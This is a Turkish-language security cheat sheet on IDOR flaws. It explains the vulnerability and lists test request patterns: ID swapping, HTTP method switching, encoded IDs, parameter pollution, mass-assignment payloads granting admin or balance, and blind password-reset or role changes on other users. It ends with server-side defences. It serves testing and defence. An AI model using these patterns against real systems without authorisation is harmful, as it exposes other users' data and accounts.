# 04 - IDOR (Insecure Direct Object Reference)

> Uygulamanın bir nesneye erişimde yetki kontrolü yapmadan, doğrudan kullanıcı kontrollü bir tanımlayıcıya (ID) güvenmesiyle oluşan zafiyet.

## Zafiyet Nedir?

IDOR, bir kullanıcının kendi nesnesine ait tanımlayıcıyı (kullanıcı ID, sipariş no, dosya adı) değiştirerek başkasının verisine eriştiği bir yetkilendirme zafiyetidir. Kök neden: sunucunun "bu kaydı bu kullanıcı görebilir mi?" kontrolünü yapmaması. OWASP "Broken Access Control" kategorisinin en yaygın örneğidir.

## Tespit

- URL, gövde, başlık ve çerezlerdeki tanımlayıcıları ara: `?id=`, `?user=`, `?account=`, `/api/orders/1024`.
- Değeri artır/azalt veya başka hesabınkiyle değiştir; başka kullanıcının verisi dönüyor mu bak.
- En güvenilir yöntem iki test hesabı kullanmak: A hesabıyla B'nin kaydına erişmeyi dene.

## Test Desenleri

### Sayısal ID manipülasyonu

```
GET /api/kullanici/1001/profil     ->  /api/kullanici/1002/profil
GET /fatura?id=5001                 ->  /fatura?id=5002
GET /dosya/indir?no=1024            ->  /dosya/indir?no=1025
GET /mesaj?id=9  ->  8, 10, 1, 9999, 0, -1
POST /siparis {"id":5001}           ->  {"id":5002}
```

### Yöntem / uç değiştirme

```
GET  /api/gonderi/55     ->  DELETE /api/gonderi/55
GET  /api/hesap/55       ->  PUT /api/hesap/55
GET  /api/belge/12       ->  POST /api/belge/12/paylas
Okuma yetkisi var ama yazma/silme kontrolü zayıf olabilir.
```

### Tahmin edilebilir olmayan ID (UUID/hash) sızıntısı

```
- Listeleme, e-posta, log, referans, paylaşım linki gibi başka uçlarda sızan ID'leri topla
- Sıralı/tarih tabanlı UUID (v1) tahmini
- Zayıf hash: md5(sayi), base64(id)
```

### Kodlanmış / dolaylı referanslar

```
GET /api/doc?ref=MTAwMg==      base64("1002") -> decode et, komşu değeri dene
GET /api/doc?ref=MTAwMw==      base64("1003")
id=%31%30%30%32                 URL-encoded 1002
ref=31303032                    hex 1002
```

### Parametre kirliliği (HPP) / dizi ile atlatma

```
id=1002
id=1001&id=1002
id[]=1001&id[]=1002
{"id":[1001,1002]}
{"id":1001,"id":1002}
id=1001&admin_id=1002
```

### Kütle atama (Mass Assignment) ile yetki yükseltme

```json
{"ad":"Ali","rol":"admin"}
{"ad":"Ali","isAdmin":true}
{"ad":"Ali","role_id":1}
{"ad":"Ali","user_id":1002}
{"ad":"Ali","account_balance":999999}
{"ad":"Ali","email_verified":true}
{"ad":"Ali","permissions":["*"]}
```

### Yol / dosya tabanlı IDOR

```
GET /files/user_1001/rapor.pdf   ->  /files/user_1002/rapor.pdf
GET /download?path=/home/ali/a   ->  /home/veli/a
GET /avatar/1001.jpg             ->  /avatar/1002.jpg
GET /export/invoice_5001.pdf     ->  invoice_5002.pdf
```

### Blind IDOR (çıktı dönmese de eylem gerçekleşir)

```
POST /api/kullanici/1002/parola-sifirla
POST /api/kullanici/1002/rol {"rol":"admin"}
DELETE /api/yorum/9987
Yanıt 200/204 dönerse ve eylem başkasında gerçekleştiyse zafiyet var.
```

### Statik olmayan tanımlayıcılar

```
- E-posta ile: ?email=kurban@site.com
- Kullanıcı adı ile: ?username=admin
- Telefon, TC, müşteri no gibi tahmin edilebilir alanlar
- GUID sızıntısı sonrası: ?token=<baskasinin-guidi>
```

## Test Notları

IDOR'da "payload" yoktur; zafiyet yetki kontrolünün eksikliğidir. Yaklaşım:

- Her nesne referansı için "sahiplik/rol kontrolü var mı?" sor.
- Yatay (aynı seviye başka kullanıcı) ve dikey (düşük -> yüksek yetki) erişimi ayrı dene.
- Otomasyon: Burp "Autorize" veya "Auth Analyzer" eklentileri (iki oturumla otomatik karşılaştırma).
- Değerleri sistematik dene: +1, -1, 0, çok büyük, negatif, başka hesabın gerçek ID'si.

## Korunma

1. Her istekte sunucu tarafı yetkilendirme: "Bu oturumdaki kullanıcı bu nesnenin sahibi mi / erişim rolü var mı?" kontrolünü her nesne erişiminde yap.
   ```python
   kayit = Siparis.query.get(id)
   if kayit.kullanici_id != current_user.id:
       abort(403)
   ```
2. Sahiplik kapsamlı sorgular: `WHERE id=? AND kullanici_id=?`.
3. Kütle atamayı engelle: Yalnızca izin verilen alanları bağla (allow-list / DTO); `rol`, `isAdmin` gibi alanları kullanıcı girdisinden alma.
4. Dolaylı referans haritası: Gerçek DB ID'si yerine oturuma özel geçici referanslar.
5. Merkezi erişim kontrol katmanı (RBAC/ABAC) ve testlerle doğrulama.
6. Tahmin edilemez ID yardımcıdır ama yetki kontrolünün yerini tutmaz.

## Kaynaklar

- [OWASP - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger - Access control (IDOR)](https://portswigger.net/web-security/access-control/idor)
- [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
